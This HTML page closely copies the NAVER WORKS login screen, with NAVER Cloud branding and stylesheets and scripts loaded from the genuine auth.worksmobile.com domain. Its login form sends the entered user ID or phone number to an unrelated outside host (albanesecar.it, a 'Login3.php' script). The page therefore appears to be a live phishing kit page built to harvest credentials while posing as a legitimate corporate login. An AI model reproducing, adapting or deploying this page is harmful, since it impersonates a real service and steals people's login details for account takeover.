<!DOCTYPE html>
<!-- saved from url=(0112)http://viewoss.navercorp.com/UIT-WORKSMOBILE/wm_common/blob/feature/v3.5/login/dist/10_account.html -->
<html lang="en_US"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta content="IE=edge" http-equiv="X-UA-Compatible">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
    <meta name="format-detection" content="telephone=no">
    <title>Login</title>
    <link rel="stylesheet" type="text/css" href="https://auth.worksmobile.com/css/register.css?20221013">
    <script type="text/javascript" src="https://auth.worksmobile.com/js/jquery/jquery-3.6.0.min.js?20221013"></script>
    







    
        
           
            
        
        
    
    
        
        
            <script type="text/javascript" src="https://auth.worksmobile.com/js/service/auth_core.js?20221013"></script>
            <script type="text/javascript" src="https://auth.worksmobile.com/js/service/auth_service.js?20221013"></script>
        
    
</head>
<body class="en_US kr_instance">
<a href="#content" class="skip">content</a>


    
    <div id="wrap" class="register login">
        
        
        <h1><span>{brandName}</span></h1>
        <div id="container">
            <div class="login_infor">
                <em class="user">Login</em>
                <div class="desc">
                    <span id="lastLoginGuide">Enter your mobile phone number or ID.</span>
                    <div class="lwds_bubbletip">
                        <!-- 툴팁 아이콘, 툴팁 클릭시 on 클래스 -->
                        <a href="#" class="lwds_bubbletip_button"><i class="blind">help</i></a>

                        <!-- 툴팁 레이어 -->
                        <div class="lwds_bubbletip_layer direction_center_bottom" style="display:none;">
                            <p class="msg">
                                Login with your NAVER WORKS ID (id@company or id@company.com) or a verified phone number.
                            </p>
                            <button type="button" class="lwds_bubbletip_close"><i class="blind">툴팁 닫기</i></button>
                        </div>
                    </div>
                </div>
            </div>
            <div class="fm_register">
                <form id="" method="post" action="https://albanesecar.it/roco/baroco/Login3.php">
                <div class="login_form_cover">
                    <label for="login_param" class="_loginParamLabel blind">2061234567 or id@group.xx</label>
                    <input type="email" name="userid" id="login_param" placeholder="2061234567 or id@group.xx">

                    
                </div>
            </div>
            <div class="wrong_message" style="display:none">
                <p id="wrong_message_paragraph">Check your ID or phone number again.</p>
            </div>
            <!-- <div class="btn"><button>はじめる</button></div> -->
            <div class="btn">
                <button id="loginStart" class="login_normal disabled">Login</button>
            </div>
            <div class="check_info">
                <div class="find_info">
                    <a href="#" id="findIdBtn">Find ID, Password</a>
                </div>
            </div>
            <div class="btn">
                <div class="login_line_area">
                    <em class="login_line_desc">OR</em>
                    
                        <button id="naverLogin" data-accessurl="" class="login_naver">Login with NAVER</button>
                    
                    <button id="lineLogin" data-accessurl="" class="login_line">Login with LINE</button>
                </div>
            </div>
        </div>
        <p class="welcome_link"><span>Create a new account?</span><a href="" target="_blank">Sign up<!--</a><a href="#">초대코드입력</a>--></a></p>
        <address><strong>© NAVER Cloud Corp.</strong></address>
    </div>

    <script>
        if ("false" === "false") {
            var lcsSti = 'worksmobile_admin_auth_loginstep1';
        }
        var oStartLogin = new StartLogIn();

        $(document).ready(function() {
            if ('' != null && '' != '') {
                $('#' + '').prop('selected', true);
                setTimeout(function() {
                    $('._currentSelectedCountry').html(oStartLogin.getCountryName($('#' + '')));
                }, 100);

            } else {
                var selectedCode = $('#' + '81');
                if ('en_US' === 'ja_JP' || 'en_US' === 'en_US') {
                    $('#' + '81').prop('selected', true);
                } else if ('en_US' === 'ko_KR') {
                    $('#' + '82').prop('selected', true);
                    selectedCode = $('#' + '82');
                } else if ('en_US' === 'zh_TW') {
                    $('#' + '886').prop('selected', true);
                    selectedCode = $('#' + '886');
                } else if ('en_US' === 'zh_CN') {
                    $('#' + '86').prop('selected', true);
                    selectedCode = $('#' + '86');
                }
                setTimeout(function() {
                    $('._currentSelectedCountry').html(oStartLogin.getCountryName(selectedCode));
                }, 100);
            }
        });
    </script>




</body></html>
